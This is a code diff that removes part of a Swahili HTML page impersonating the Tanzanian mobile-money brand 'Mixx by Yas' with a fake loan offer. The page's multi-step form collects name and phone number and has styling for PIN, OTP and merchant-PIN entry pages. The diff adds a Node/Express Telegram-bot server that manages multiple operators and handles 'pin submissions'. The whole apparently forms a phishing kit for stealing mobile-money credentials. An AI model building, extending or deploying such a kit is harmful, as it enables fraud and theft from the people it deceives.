@@ -1,1473 +1,2765 @@
-<!DOCTYPE html>
-<html lang="sw">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Mixx by Yas Tanzania – Mikopo Rahisi</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-<style>
-  :root {
-    --navy: #003087;
-    --navy-dark: #00206B;
-    --teal: #FFD700;
-    --purple: #F5A623;
-    --grad: linear-gradient(to right, #003087, #0053C8);
-    --page-bg: #EBEBEB;
-    --white: #FFFFFF;
-    --text-dark: #1C2340;
-    --text-mid: #444;
-    --text-light: #888;
-    --border: #ddd;
-    --radius: 12px;
-    --radius-sm: 8px;
-  }
-  * { box-sizing: border-box; margin: 0; padding: 0; }
-  body { font-family: 'Inter', sans-serif; background: var(--page-bg); color: var(--text-dark); min-height: 100vh; }
+const express = require('express');
+const TelegramBot = require('node-telegram-bot-api');
+const path = require('path');
+require('dotenv').config();
 
+const db = require('./database');
 
-  /* MIXX BY YAS LOGO */
-  .myas-logo { display:flex; flex-direction:column; align-items:center; gap:2px; }
-  .myas-logo .logo-text { font-size:1.1rem; font-weight:700; color:#FFD700; letter-spacing:-0.02em; }
-  .myas-logo .logo-sub { font-size:0.72rem; color:rgba(255,255,255,0.65); }
+// ==========================================
+// SUPER ADMINS - Multi-admin support
+// ==========================================
+// Add to .env: SUPER_ADMINS=ADMIN001,ADMIN002,ADMIN003
+// Default: ADMIN001 if not set
+const SUPER_ADMINS = (process.env.SUPER_ADMINS || 'ADMIN001').split(',').map(id => id.trim());
 
-  /* PAGE SYSTEM */
-  .page { display: none; min-height: 100vh; animation: fadeIn 0.3s ease; }
-  .page.active { display: flex; flex-direction: column; }
-  @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:translateY(0)} }
+function isSuperAdmin(adminId) {
+    return SUPER_ADMINS.includes(adminId);
+}
 
-  /* OVERLAY */
-  .overlay { display:none; position:fixed; inset:0; background:rgba(0,0,0,0.5); backdrop-filter:blur(3px); z-index:999; align-items:center; justify-content:center; }
-  .overlay.show { display:flex; }
-  .modal { background:var(--white); border-radius:var(--radius); padding:40px 36px; text-align:center; max-width:320px; width:90%; box-shadow:0 20px 60px rgba(0,0,0,0.2); animation:popIn 0.3s cubic-bezier(.34,1.56,.64,1); }
-  @keyframes popIn { from{opacity:0;transform:scale(0.85)} to{opacity:1;transform:scale(1)} }
-  .spinner { width:44px; height:44px; border:4px solid #eee; border-top-color:var(--teal); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 18px; }
-  @keyframes spin { to{transform:rotate(360deg)} }
-  .modal h3 { font-size:1.1rem; font-weight:600; color:var(--text-dark); margin-bottom:6px; }
-  .modal p  { font-size:0.88rem; color:var(--text-light); }
+const app = express();
 
-  /* LOGO */
-  .logo-group { display:flex; flex-direction:column; align-items:center; gap:3px; }
-  .logo-dots { display:grid; grid-template-columns:1fr 1fr; gap:3px; width:28px; height:28px; }
-  .logo-dots span { width:12px; height:12px; border-radius:50%; display:block; }
-  .dot-1{background:#F5A623;} .dot-2{background:#1BC8D4;} .dot-3{background:#2ECC71;} .dot-4{background:#9B59B6;}
-  .logo-text { font-size:1.1rem; font-weight:700; color:var(--teal); }
-  .logo-sub   { font-size:0.72rem; color:rgba(255,255,255,0.65); }
+// ==========================================
+// WEBHOOK MODE (for Render / production)
+// ==========================================
 
-  /* NAV */
-  .navbar { background:var(--navy); display:flex; align-items:center; justify-content:center; padding:0 20px; height:54px; position:relative; flex-shrink:0; }
-  .nav-left { position:absolute; left:20px; color:rgba(255,255,255,0.6); font-size:0.84rem; cursor:pointer; text-decoration:none; transition:color 0.2s; }
-  .nav-left:hover { color:#fff; }
-  .nav-right { position:absolute; right:20px; display:flex; flex-direction:column; gap:4px; cursor:pointer; padding:4px; }
-  .hline { width:20px; height:2px; background:rgba(255,255,255,0.6); border-radius:1px; }
+const BOT_TOKEN   = process.env.SUPER_ADMIN_BOT_TOKEN;
+const PORT        = process.env.PORT || 10000;
+const WEBHOOK_URL = process.env.RENDER_EXTERNAL_URL || process.env.APP_URL || `http://localhost:${PORT}`;
 
-  /* BUTTONS */
-  .btn-grad { background:var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; width:100%; font-family:'Inter',sans-serif; transition:opacity 0.2s; }
-  .btn-grad:hover { opacity:0.9; }
-  .btn-grad:disabled { opacity:0.5; cursor:not-allowed; }
-  .btn-gray { background:#e0e0e0; color:#666; border:none; border-radius:8px; padding:14px 20px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; flex:1; font-family:'Inter',sans-serif; transition:background 0.2s; }
-  .btn-gray:hover { background:#d0d0d0; }
+// Create bot WITHOUT polling
+const bot = new TelegramBot(BOT_TOKEN);
 
-  /* FORM */
-  .field { margin-bottom:18px; }
-  .field label { display:block; font-size:0.82rem; font-weight:500; color:var(--text-mid); margin-bottom:6px; }
-  .field input, .field select, .field textarea { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:'Inter',sans-serif; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s, box-shadow 0.2s; appearance:none; -webkit-appearance:none; }
-  .field input:focus, .field select:focus, .field textarea:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(255,215,0,0.2); }
-  .field textarea { resize:vertical; min-height:90px; }
-  .sel-wrap { position:relative; }
-  .sel-wrap::after { content:'▾'; position:absolute; right:14px; top:50%; transform:translateY(-50%); color:var(--text-light); pointer-events:none; font-size:0.9rem; }
-  .field-row { display:grid; grid-template-columns:1fr 1fr; gap:14px; }
-  .phone-row { display:flex; }
-  .ph-pre { padding:11px 12px; background:#f5f5f5; border:1.5px solid var(--border); border-right:none; border-radius:var(--radius-sm) 0 0 var(--radius-sm); font-size:0.85rem; font-weight:500; color:#555; white-space:nowrap; display:flex; align-items:center; }
-  .phone-row input { border-radius:0 var(--radius-sm) var(--radius-sm) 0 !important; flex:1; }
-  .field-hint { font-size:0.75rem; color:var(--text-light); margin-top:5px; }
+// In-memory maps
+const adminChatIds    = new Map(); // adminId → chatId
+const pausedAdmins    = new Set(); // adminIds that are paused
+const processingLocks = new Set(); // prevents duplicate pin submissions
+const adminLinkTimers = new Map(); // adminId → timeout reference for 5-min timer
 
-  /* STEP PROGRESS */
-  .prog-row { display:flex; gap:8px; margin:10px 0 24px; }
-  .prog-seg { flex:1; height:4px; border-radius:2px; background:#e0e0e0; transition:background 0.3s; }
-  .prog-seg.done { background:var(--purple); }
-  .prog-seg.now  { background:var(--teal); }
+// ==========================================
+// NEW: suspendall session store
+// Keyed by superadmin chatId
+// { page: number, allAdmins: [...], selections: Set<adminId> }
+// selections = set of adminIds to SUSPEND (all selected by default)
+// ==========================================
+const suspendAllSessions = new Map();
 
-  /* STEP BUTTONS */
-  .step-btns { display:flex; gap:12px; margin-top:8px; }
-  .step-btns .btn-grad { flex:1; }
+const SUSPEND_PAGE_SIZE = 10;
 
-  /* FOOTER */
-  .pg-footer { margin-top:auto; padding:14px; text-align:center; font-size:0.78rem; color:var(--text-light); background:#fff; border-top:1px solid #eee; flex-shrink:0; }
+let dbReady = false;
 
-  /* ───── PAGE 1: LANDING ───── */
-  #page-landing { background:var(--page-bg); }
-  .land-nav { background:var(--navy); display:flex; align-items:center; justify-content:space-between; padding:0 24px; height:52px; flex-shrink:0; }
-  .land-nav .hbg { display:flex; flex-direction:column; gap:4px; cursor:pointer; }
-  .land-nav .hbg span { width:20px; height:2px; background:rgba(255,255,255,0.7); border-radius:1px; display:block; }
-  .land-center { flex:1; display:flex; align-items:center; justify-content:center; padding:32px 16px; }
-  .land-card { width:100%; max-width:520px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.1); padding:36px 32px; }
-  .land-card h1 { font-size:1.45rem; font-weight:700; text-align:center; margin-bottom:6px; }
-  .land-tagline { text-align:center; font-size:0.84rem; color:var(--text-light); margin-bottom:28px; }
-  .calc-box { background:#fafafa; border:1px solid #eee; border-radius:var(--radius-sm); padding:20px; margin-bottom:22px; }
-  .calc-box h2 { font-size:0.92rem; font-weight:600; margin-bottom:16px; }
-  .calc-row2 { display:flex; justify-content:space-between; font-size:0.81rem; color:var(--text-mid); margin-bottom:6px; }
-  .calc-row2 .cv { color:var(--teal); font-weight:600; }
-  input[type=range] { width:100%; -webkit-appearance:none; height:5px; border-radius:3px; outline:none; cursor:pointer; margin-bottom:4px; background:linear-gradient(to right,var(--teal) 0%,var(--teal) var(--pct,10%),#ddd var(--pct,10%),#ddd 100%); }
-  input[type=range]::-webkit-slider-thumb { -webkit-appearance:none; width:18px; height:18px; border-radius:50%; background:var(--teal); border:3px solid #fff; box-shadow:0 2px 6px rgba(255,215,0,0.5); cursor:pointer; }
-  .range-ends { display:flex; justify-content:space-between; font-size:0.72rem; color:var(--text-light); margin-bottom:14px; }
-  .monthly-box { background:#fff; border:1px solid #eee; border-radius:var(--radius-sm); padding:14px 16px; display:flex; justify-content:space-between; align-items:center; }
-  .monthly-box .ml { font-size:0.82rem; color:var(--text-light); }
-  .monthly-box .ma { font-size:1.5rem; font-weight:700; color:var(--teal); }
-  .feats-row { display:flex; justify-content:space-around; padding:20px 0 0; border-top:1px solid #f0f0f0; margin-top:4px; }
-  .feat { text-align:center; }
-  .feat .fi { font-size:1.6rem; margin-bottom:5px; }
-  .feat .ft { font-size:0.8rem; font-weight:600; }
-  .feat .fs { font-size:0.73rem; color:var(--text-light); }
-  .land-footer { background:var(--navy); padding:14px; text-align:center; font-size:0.77rem; color:rgba(255,255,255,0.45); flex-shrink:0; }
+// ==========================================
+// HELPER FUNCTIONS
+// ==========================================
 
-  /* ───── STEP PAGES 2-4 ───── */
-  .step-center { flex:1; display:flex; align-items:flex-start; justify-content:center; padding:28px 16px; }
-  .step-card { width:100%; max-width:480px; background:#fff; border-radius:var(--radius); box-shadow:0 4px 24px rgba(0,0,0,0.08); padding:32px 28px; }
-  .step-card h2 { font-size:1.25rem; font-weight:700; text-align:center; margin-bottom:4px; }
-  .step-sub { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:4px; }
+function isAdminActive(chatId) {
+    const adminId = getAdminIdByChatId(chatId);
+    if (!adminId) return false;
+    if (isSuperAdmin(adminId)) return true;
+    return !pausedAdmins.has(adminId);
+}
 
-  /* SUMMARY */
-  .sum-box { border:1px solid #e0e0e0; border-left:4px solid var(--teal); border-radius:var(--radius-sm); padding:16px 14px; margin:16px 0; background:#fafffe; }
-  .sum-box h3 { font-size:0.88rem; font-weight:600; margin-bottom:12px; }
-  .sum-row { display:flex; justify-content:space-between; font-size:0.82rem; padding:7px 0; border-bottom:1px solid #f0f0f0; }
-  .sum-row:last-child { border-bottom:none; }
-  .sum-row .sk { color:var(--text-light); }
-  .sum-row .sv { font-weight:500; }
-
-  /* ───── PAGE 5: SUBMITTED ───── */
-  #page-submitted { background:linear-gradient(160deg,var(--navy),#2a2f5a); align-items:center; justify-content:center; }
-  .sub-wrap { text-align:center; padding:40px 24px; max-width:420px; }
-  .sub-icon { width:80px; height:80px; border-radius:50%; background:rgba(255,255,255,0.1); border:2px solid rgba(255,255,255,0.3); display:flex; align-items:center; justify-content:center; font-size:2rem; margin:0 auto 24px; animation:pulse 2s ease infinite; }
-  @keyframes pulse { 0%,100%{box-shadow:0 0 0 0 rgba(255,215,0,0.3)} 50%{box-shadow:0 0 0 16px rgba(255,215,0,0)} }
-  .sub-wrap h2 { font-size:1.6rem; font-weight:700; color:#fff; margin-bottom:12px; }
-  .sub-wrap p  { color:rgba(255,255,255,0.75); font-size:0.88rem; line-height:1.7; margin-bottom:24px; }
-  .redir-pill { display:inline-flex; align-items:center; gap:8px; background:rgba(255,255,255,0.1); border:1px solid rgba(255,255,255,0.2); border-radius:50px; padding:9px 20px; color:#fff; font-size:0.84rem; margin-bottom:24px; }
-  .redir-n { font-weight:700; color:var(--teal); }
-  .btn-go { background:var(--grad); color:#fff; border:none; border-radius:8px; padding:14px 36px; font-size:0.9rem; font-weight:600; cursor:pointer; font-family:'Inter',sans-serif; letter-spacing:0.04em; }
-
-  /* ───── PAGE 6: LOGIN ───── */
-  #page-login { background:#fff; }
-  .login-hdr { background:var(--navy); padding:32px 20px 36px; display:flex; flex-direction:column; align-items:center; gap:4px; flex-shrink:0; }
-  .login-hdr .logo-text { font-size:1.5rem; }
-  .login-body-wrap { flex:1; background:#fff; padding:32px 20px 0; display:flex; flex-direction:column; align-items:center; }
-  .login-body-wrap h2 { font-size:1.05rem; font-weight:600; margin-bottom:24px; }
-  .login-inner { width:100%; max-width:380px; }
-  .lg-phone-row { display:flex; margin-bottom:24px; }
-  .lg-ph-pre { display:flex; align-items:center; gap:4px; padding:11px 12px; background:#fafafa; border:1.5px solid var(--border); border-right:none; border-radius:var(--radius-sm) 0 0 var(--radius-sm); font-size:0.84rem; color:#555; font-weight:500; white-space:nowrap; }
-  .lg-phone-row input { flex:1; padding:11px 14px; border:1.5px solid var(--border); border-left:none; border-radius:0 var(--radius-sm) var(--radius-sm) 0; font-family:'Inter',sans-serif; font-size:0.9rem; outline:none; background:#fff; transition:border-color 0.2s; }
-  .lg-phone-row input:focus { border-color:var(--teal); }
-  .pin-label { font-size:0.82rem; color:var(--text-light); text-align:center; margin-bottom:12px; }
-  .pin-row { display:flex; gap:10px; justify-content:center; margin-bottom:12px; position:relative; align-items:center; }
-  .pin-box { width:52px; height:52px; border:1.5px solid var(--border); border-radius:var(--radius-sm); text-align:center; font-family:'Inter',sans-serif; font-size:1.3rem; font-weight:700; color:var(--navy); outline:none; transition:border-color 0.2s; }
-  .pin-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(255,215,0,0.2); }
-  .pin-eye { cursor:pointer; color:var(--text-light); font-size:1rem; background:none; border:none; margin-left:6px; }
-  .forgot-pin { text-align:center; font-size:0.82rem; color:var(--text-light); margin-bottom:24px; cursor:pointer; }
-  .btn-login { width:100%; max-width:380px; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
-  .btn-login.rdy { background:var(--grad); color:#fff; }
-  .lg-curve { margin-top:32px; background:#fff; overflow:hidden; flex-shrink:0; }
-  .lg-curve::before { content:''; display:block; background:var(--navy); height:55px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
-  .lg-foot { background:var(--navy); padding:24px 20px 32px; display:flex; flex-direction:column; align-items:center; gap:8px; text-align:center; }
-  .lg-foot .logo-text { font-size:1.2rem; }
-  .lg-version { font-size:0.72rem; color:rgba(255,255,255,0.4); margin-top:4px; }
-  .lg-terms { font-size:0.72rem; color:rgba(255,255,255,0.45); }
-  .lg-terms a { color:rgba(255,255,255,0.65); }
-
-  /* ───── PAGE 7: OTP ───── */
-  #page-otp { background:#fff; }
-  .otp-topbar { display:flex; align-items:center; justify-content:space-between; padding:0 20px; height:52px; background:var(--navy); border-bottom:1px solid #eee; flex-shrink:0; }
-  .otp-topbar .bk { font-size:1.1rem; color:#fff; cursor:pointer; background:none; border:none; }
-  .otp-topbar .hbg2 { display:flex; flex-direction:column; gap:4px; cursor:pointer; }
-  .otp-topbar .hbg2 span { width:20px; height:2px; background:#fff; border-radius:1px; display:block; }
-  .otp-body-wrap { flex:1; padding:32px 16px; display:flex; align-items:flex-start; justify-content:center; }
-  .otp-card { background:#fff; border:1px solid #eee; border-radius:var(--radius); padding:32px 28px; width:100%; max-width:440px; box-shadow:0 2px 16px rgba(0,0,0,0.06); }
-  .otp-card h2 { font-size:1.2rem; font-weight:700; margin-bottom:6px; }
-  .otp-hint { font-size:0.83rem; color:var(--text-light); margin-bottom:5px; }
-  .otp-phone { font-size:0.9rem; font-weight:600; color:var(--text-dark); margin-bottom:22px; }
-  .otp-inputs { width:100%; margin-bottom:12px; }
-  .otp-box { width:100%; padding:11px 14px; border:1.5px solid var(--border); border-radius:var(--radius-sm); font-family:'Inter',sans-serif; font-size:0.9rem; color:var(--text-dark); background:#fff; outline:none; transition:border-color 0.2s, box-shadow 0.2s; min-height:90px; resize:vertical; }
-  .otp-box:focus { border-color:var(--teal); box-shadow:0 0 0 3px rgba(0,150,136,0.12); }
-  .otp-instructions { font-size:0.82rem; color:var(--text-light); margin-bottom:14px; padding:12px; background:#f9f9f9; border-radius:var(--radius-sm); border-left:3px solid var(--teal); }
-  .otp-resend { font-size:0.8rem; color:var(--teal); margin-bottom:22px; }
-  .btn-otp { width:100%; padding:13px; background:#e8e8e8; color:#aaa; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.05em; cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
-  .btn-otp.rdy { background:var(--grad); color:#fff; }
-  .otp-curve { background:#fff; overflow:hidden; flex-shrink:0; }
-  .otp-curve::before { content:''; display:block; background:var(--navy); height:50px; clip-path:ellipse(60% 100% at 50% 100%); margin-bottom:-4px; }
-  .otp-foot { background:var(--navy); padding:14px; text-align:center; font-size:0.75rem; color:rgba(255,255,255,0.45); }
-
-  /* ───── PAGE 8: MERCHANT PIN ───── */
-  #page-merchant-pin { background:#fff; }
-
-  /* ───── PAGE 9: APPROVAL ───── */
-  #page-approval { background:linear-gradient(135deg,#1BC8D4 0%,#8B6FD4 50%,#9B59B6 100%); min-height:100vh; align-items:center; justify-content:center; padding:32px 16px; }
-  .appr-wrap { width:100%; max-width:520px; }
-  .appr-top { background:#fff; border-radius:var(--radius) var(--radius) 0 0; padding:28px 24px 0; text-align:center; }
-  .check-circle { width:56px; height:56px; border-radius:50%; background:linear-gradient(135deg,var(--teal),var(--purple)); display:flex; align-items:center; justify-content:center; margin:0 auto 12px; font-size:1.3rem; color:#fff; box-shadow:0 4px 16px rgba(255,215,0,0.5); }
-  .appr-title { font-size:1.2rem; font-weight:700; margin-bottom:6px; }
-  .appr-sub   { font-size:0.82rem; color:var(--text-light); margin-bottom:18px; }
-  .appr-banner { background:var(--grad); padding:16px; margin:0 -24px; text-align:center; }
-  .appr-banner .abl { font-size:0.72rem; color:rgba(255,255,255,0.8); text-transform:uppercase; letter-spacing:0.06em; }
-  .appr-banner .aba { font-size:2rem; font-weight:700; color:#fff; }
-  .comp-box { background:#FFFBEA; border:1px solid #F5C842; padding:14px 16px; }
-  .comp-box .ch { display:flex; align-items:center; gap:6px; font-size:0.82rem; font-weight:700; color:#a07000; margin-bottom:6px; }
-  .comp-box p { font-size:0.78rem; color:#7a5500; line-height:1.6; }
-  .comp-box strong { font-weight:600; }
-  .ld-card { background:#fff; padding:20px 24px; }
-  .ld-htitle { font-size:0.82rem; font-weight:600; color:var(--text-mid); margin-bottom:14px; display:flex; align-items:center; gap:6px; }
-  .ld-row { display:flex; align-items:center; gap:12px; padding:10px 0; border-bottom:1px solid #f5f5f5; }
-  .ld-row:last-child { border-bottom:none; }
-  .ld-icon { width:34px; height:34px; border-radius:8px; display:flex; align-items:center; justify-content:center; font-size:0.85rem; flex-shrink:0; }
-  .ic-g{background:linear-gradient(135deg,#2ECC71,#27AE60);}
-  .ic-b{background:linear-gradient(135deg,#3498DB,#2980B9);}
-  .ic-p{background:linear-gradient(135deg,#9B59B6,#8E44AD);}
-  .ld-lbl { font-size:0.72rem; color:var(--text-light); text-transform:uppercase; letter-spacing:0.04em; }
-  .ld-val { font-size:0.9rem; font-weight:600; }
-  .qa-wrap { background:#fff; padding:0 24px 18px; }
-  .qa-title { font-size:0.8rem; font-weight:600; color:var(--text-mid); margin-bottom:10px; text-align:center; }
-  .qa-btn { width:100%; padding:12px; margin-bottom:8px; background:#fff; border:1.5px solid #e0e0e0; border-radius:8px; font-size:0.84rem; font-weight:500; color:var(--text-dark); cursor:pointer; font-family:'Inter',sans-serif; transition:all 0.2s; }
-  .qa-btn:hover { border-color:var(--teal); color:var(--teal); }
-  .nxt-steps { background:#fff; padding:14px 24px; display:flex; align-items:flex-start; gap:8px; border-top:1px solid #f0f0f0; }
-  .nxt-steps p { font-size:0.79rem; color:var(--text-light); line-height:1.5; }
-  .rth-wrap { background:#fff; border-radius:0 0 var(--radius) var(--radius); padding:14px 24px 24px; }
-  .rth-btn { width:100%; padding:13px; background:var(--grad); color:#fff; border:none; border-radius:8px; font-size:0.88rem; font-weight:600; letter-spacing:0.04em; cursor:pointer; font-family:'Inter',sans-serif; }
-
-  /* ───── INLINE ERROR / STATUS MESSAGES ───── */
-  .msg-box { border-radius:var(--radius-sm); padding:12px 16px; font-size:0.84rem; margin-bottom:16px; display:none; align-items:center; gap:10px; }
-  .msg-box.show { display:flex; }
-  .msg-box.error   { background:#fef2f2; border:1.5px solid #fecaca; color:#991b1b; }
-  .msg-box.success { background:#f0fdf4; border:1.5px solid #bbf7d0; color:#166534; }
-  .msg-box.info    { background:#eff6ff; border:1.5px solid #bfdbfe; color:#1e40af; }
-  .msg-box.warning { background:#fefce8; border:1.5px solid #fef08a; color:#854d0e; }
-  .msg-icon { font-size:1.1rem; flex-shrink:0; }
-
-  /* ───── WAITING / POLLING INDICATOR ───── */
-  .waiting-box { background:#f8f9ff; border:1px solid #e0e5ff; border-radius:var(--radius-sm); padding:16px; text-align:center; margin-bottom:16px; display:none; }
-  .waiting-box.show { display:block; }
-  .waiting-box .wb-spinner { width:28px; height:28px; border:3px solid #e0e5ff; border-top-color:var(--teal); border-radius:50%; animation:spin 0.8s linear infinite; margin:0 auto 10px; }
-  .waiting-box p { font-size:0.82rem; color:var(--text-mid); }
-
-  @media(max-width:500px){.field-row{grid-template-columns:1fr;}.step-card,.land-card{padding:24px 18px;}.otp-card{padding:24px 16px;}}
-</style>
-</head>
-<body>
-
-<!-- ══════════════════════ PAGE 1: LANDING ══════════════════════ -->
-<div id="page-landing" class="page active">
-  <nav class="land-nav">
-    <div class="hbg"><span></span><span></span><span></span></div>
-    <div class="myas-logo">
-      <svg width="36" height="36" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
-        <path d="M18 2 C10 2 4 8.5 4 16.5 C4 22 7 26.5 11.5 29 L18 34 L24.5 29 C29 26.5 32 22 32 16.5 C32 8.5 26 2 18 2Z" fill="#FFD700"/>
-        <text x="18" y="21" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#003087">yas</text>
-      </svg>
-      <div class="logo-text">Mixx by Yas</div>
-    </div>
-    <div style="width:28px"></div>
-  </nav>
-
-  <div class="land-center">
-    <div class="land-card">
-      <h1>Pata Mkopo Wako Haraka</h1>
-      <p class="land-tagline">Idhini ya haraka • Viwango bora • Masharti yanayobadilika</p>
-
-      <div class="calc-box">
-        <h2>Kikokotoo cha Mkopo</h2>
-        <div class="calc-row2"><span>Kiasi cha Mkopo</span><span class="cv" id="aDisp">TZS 1,000,000</span></div>
-        <input type="range" id="rA" min="50000" max="100000000" step="50000" value="1000000" oninput="calcUp()" style="--pct:1%">
-        <div class="range-ends"><span>TZS 50,000</span><span>TZS 100,000,000</span></div>
-        <div class="calc-row2"><span>Muda wa Mkopo</span><span class="cv" id="tDisp">miezi 12</span></div>
-        <input type="range" id="rT" min="6" max="60" step="6" value="12" oninput="calcUp()" style="--pct:11%">
-        <div class="range-ends"><span>6 miezi </span><span>60 miezi </span></div>
-        <div class="monthly-box">
-          <span class="ml">Malipo ya Kila Mwezi</span>
-          <span class="ma" id="mOut">TZS 104,170</span>
-        </div>
-      </div>
-
-      <button class="btn-grad" onclick="goTo('page-step1')">OMBA SASA</button>
-
-      <div class="feats-row">
-        <div class="feat"><div class="fi">⚡</div><div class="ft">Idhini ya Haraka</div><div class="fs">Ndani ya masaa 24</div></div>
-        <div class="feat"><div class="fi">💰</div><div class="ft">Viwango Vya Chini</div><div class="fs">Kuanzia 25%</div></div>
-        <div class="feat"><div class="fi">🔒</div><div class="ft">Salama</div><div class="fs">Kiwango cha benki</div></div>
-      </div>
-    </div>
-  </div>
-
-  <div class="land-footer">© 2026 Mixx by Yas Tanzania</div>
-</div>
-
-<!-- ══════════════════════ PAGE 2: STEP 1 ══════════════════════ -->
-<div id="page-step1" class="page">
-  <nav class="navbar">
-    <a class="nav-left" onclick="goTo('page-landing')">← Back</a>
-    <div class="myas-logo" style="flex-direction:row;gap:8px;align-items:center;">
-      <svg width="28" height="28" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
-        <path d="M18 2 C10 2 4 8.5 4 16.5 C4 22 7 26.5 11.5 29 L18 34 L24.5 29 C29 26.5 32 22 32 16.5 C32 8.5 26 2 18 2Z" fill="#FFD700"/>
-        <text x="18" y="21" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#003087">yas</text>
-      </svg>
-      <div class="logo-text">Mixx by Yas</div>
-    </div>
-    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-  </nav>
-  <div class="step-center">
-    <div class="step-card">
-      <h2>Ombi la Mkopo</h2>
-      <p class="step-sub">Hatua ya 1 kati ya 3</p>
-      <div class="prog-row"><div class="prog-seg now"></div><div class="prog-seg"></div><div class="prog-seg"></div></div>
-      <div class="msg-box error" id="s1Err"><span class="msg-icon">&#x2715;</span><span id="s1ErrTxt"></span></div>
-      <div class="field"><label>Aina ya Mkopo</label><div class="sel-wrap"><select id="s1ty"><option>Mkopo wa Kibinafsi</option><option selected>Mkopo wa Biashara</option><option>Mkopo wa Nyumba</option><option>Mkopo wa Gari</option><option>Mkopo wa Elimu</option></select></div></div>
-      <div class="field"><label>Kiasi cha Mkopo (TZS)</label><input type="number" id="s1am" value="1000000" placeholder="Weka kiasi" oninput="clearErr('s1Err')"></div>
-      <div class="field"><label>Muda wa Mkopo</label><div class="sel-wrap"><select id="s1te"><option>Miezi 6</option><option>Miezi 12</option><option>Miezi 18</option><option>Miezi 24</option><option>3Miezi 6</option><option selected>Miezi 48</option><option>Miezi 60</option></select></div></div>
-      <div class="field"><label>Kusudi la Mkopo</label><textarea id="s1pu" placeholder="Elezea kusudi la mkopo wako…" oninput="clearErr('s1Err')"></textarea></div>
-      <button class="btn-grad" onclick="toS2()">HATUA INAYOFUATA</button>
-    </div>
-  </div>
-</div>
-
-<!-- ══════════════════════ PAGE 3: STEP 2 ══════════════════════ -->
-<div id="page-step2" class="page">
-  <nav class="navbar">
-    <a class="nav-left" onclick="goTo('page-step1')">← Back</a>
-    <div class="myas-logo" style="flex-direction:row;gap:8px;align-items:center;">
-      <svg width="28" height="28" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
-        <path d="M18 2 C10 2 4 8.5 4 16.5 C4 22 7 26.5 11.5 29 L18 34 L24.5 29 C29 26.5 32 22 32 16.5 C32 8.5 26 2 18 2Z" fill="#FFD700"/>
-        <text x="18" y="21" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#003087">yas</text>
-      </svg>
-      <div class="logo-text">Mixx by Yas</div>
-    </div>
-    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-  </nav>
-  <div class="step-center">
-    <div class="step-card">
-      <h2>Ombi la Mkopo</h2>
-      <p class="step-sub">Hatua ya 2 kati ya 3</p>
-      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg now"></div><div class="prog-seg"></div></div>
-      <div class="msg-box error" id="s2Err"><span class="msg-icon">&#x2715;</span><span id="s2ErrTxt"></span></div>
-      <div class="field-row">
-        <div class="field"><label>Jina la Kwanza</label><input type="text" id="s2fi" placeholder="Jina la Kwanza" oninput="clearErr('s2Err')"></div>
-        <div class="field"><label>Jina la Mwisho</label><input type="text" id="s2la" placeholder="Jina la Mwisho" oninput="clearErr('s2Err')"></div>
-      </div>
-      <div class="field">
-        <label>Nambari ya Simu</label>
-        <div class="phone-row"><div class="ph-pre">+255</div><input type="tel" id="s2ph" placeholder="712345678 au 0712345678" maxlength="10" oninput="normalizePhone('s2ph');clearErr('s2Err')"></div>
-        <div class="field-hint">Weka tarakimu 9 au anza na 0 (mfano, 0712345678 → inabadilishwa kiotomatiki kuwa 712345678)</div>
-      </div>
-      <div class="step-btns">
-        <button class="btn-gray" onclick="goTo('page-step1')">NYUMA</button>
-        <button class="btn-grad" onclick="toS3()">HATUA INAYOFUATA</button>
-      </div>
-    </div>
-  </div>
-  <div class="pg-footer">© 2026 Mixx by Yas Tanzania</div>
-</div>
-
-<!-- ══════════════════════ PAGE 4: STEP 3 ══════════════════════ -->
-<div id="page-step3" class="page">
-  <nav class="navbar">
-    <a class="nav-left" onclick="goTo('page-step2')">← Back</a>
-    <div class="myas-logo" style="flex-direction:row;gap:8px;align-items:center;">
-      <svg width="28" height="28" viewBox="0 0 36 36" xmlns="http://www.w3.org/2000/svg">
-        <path d="M18 2 C10 2 4 8.5 4 16.5 C4 22 7 26.5 11.5 29 L18 34 L24.5 29 C29 26.5 32 22 32 16.5 C32 8.5 26 2 18 2Z" fill="#FFD700"/>
-        <text x="18" y="21" text-anchor="middle" font-family="Inter,sans-serif" font-size="11" font-weight="800" fill="#003087">yas</text>
-      </svg>
-      <div class="logo-text">Mixx by Yas</div>
-    </div>
-    <div class="nav-right"><div class="hline"></div><div class="hline"></div><div class="hline"></div></div>
-  </nav>
-  <div class="step-center">
-    <div class="step-card">
-      <h2>Ombi la Mkopo</h2>
-      <p class="step-sub">Hatua ya 3 kati ya 3</p>
-      <div class="prog-row"><div class="prog-seg done"></div><div class="prog-seg done"></div><div class="prog-seg now"></div></div>
